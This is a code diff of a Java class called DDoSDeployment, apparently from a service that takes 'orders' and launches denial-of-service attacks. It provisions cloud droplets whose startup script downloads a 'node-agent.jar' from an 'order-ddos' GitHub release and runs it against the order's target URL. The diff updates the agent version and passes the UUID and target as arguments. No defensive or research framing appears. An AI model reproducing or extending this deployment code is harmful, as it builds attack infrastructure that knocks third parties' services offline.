@@ -108,7 +108,9 @@ public class DDoSDeployment {
         droplets.setUserData(userData);
         log.info("User data:\n" + userData);
         List<Key> keys = new ArrayList<>();
-        keys.add(new Key("36:59:36:cf:aa:7f:0a:1a:e9:8f:18:b9:0b:5b:59:d2"));
+        final Key key = new Key();
+        key.setFingerprint("36:59:36:cf:aa:7f:0a:1a:e9:8f:18:b9:0b:5b:59:d2");
+        keys.add(key);
         droplets.setKeys(keys);
         return droplets;
     }
@@ -125,12 +127,10 @@ public class DDoSDeployment {
                 "\n  - wget https://download.java.net/java/GA/jdk11/13/GPL/openjdk-11.0.1_linux-x64_bin.tar.gz -O /root/openjdk-11.0.1_linux-x64_bin.tar.gz\n" +
                         "  - tar xzv -C /opt -f /root/openjdk-11.0.1_linux-x64_bin.tar.gz\n" +
                         "  - update-alternatives --install /usr/bin/java java /opt/jdk-11.0.1/bin/java 1\n" +
-                        "  - wget https://github.com/order-ddos/order-ddos.github.io/releases/download/0.0.1/node-agent.jar -O /root/node-agent.jar\n" +
+                        "  - wget https://github.com/order-ddos/order-ddos.github.io/releases/download/0.0.2/node-agent-0.0.2.jar -O /root/node-agent.jar\n" +
                         "  - mkdir -p /root/node-agent\n" +
                         "  - cd /root/node-agent\n" +
-                        "  - echo '{\"uuid\": \"%s\", \"uri\": \"%s\"}' > attack.json\n" +
-                        "  - zip -rv /root/node-agent.jar attack.json\n" +
-                        "  - java -jar /root/node-agent.jar &",
+                        "  - java -jar /root/node-agent.jar %s %s &",
                 order.getUuid().toString(),
                 order.getTarget_url()
         );
